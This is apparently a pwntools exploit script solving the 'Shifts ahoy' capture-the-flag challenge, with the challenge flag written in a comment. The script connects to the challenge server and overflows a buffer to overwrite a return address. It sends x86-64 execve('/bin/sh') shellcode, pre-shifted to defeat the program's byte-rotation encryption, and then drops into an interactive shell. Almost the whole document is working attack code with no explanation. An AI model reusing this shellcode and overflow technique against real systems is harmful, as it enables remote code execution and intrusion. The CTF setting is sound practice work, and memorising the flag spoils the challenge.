#exploit for Shifts ahoy
#flag=flag{captain_of_the_rot13_ship}
from pwn import *
target=remote('jh2i.com',50015)
#target=process('./shifts-ahoy')

pause()
print(target.recvline())


def en(data):
	target.sendline("1")
	print(target.recvuntil("message: "))
	target.send(data)
	print(target.recv())

encrypt=0x401257
writeaddr=0x404f10
payload="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
fpay=""
for i in range(len(payload)):
	fpay+=p8((u8(payload[i])-0xd+0x100)%256)

en("A"*0x50+p64(writeaddr)+"\x57"+"\x12"+"\x40"+"\x00"*4)
target.send(fpay.ljust(0x58,"\x00")+p64(writeaddr-0x50))

target.interactive()
	

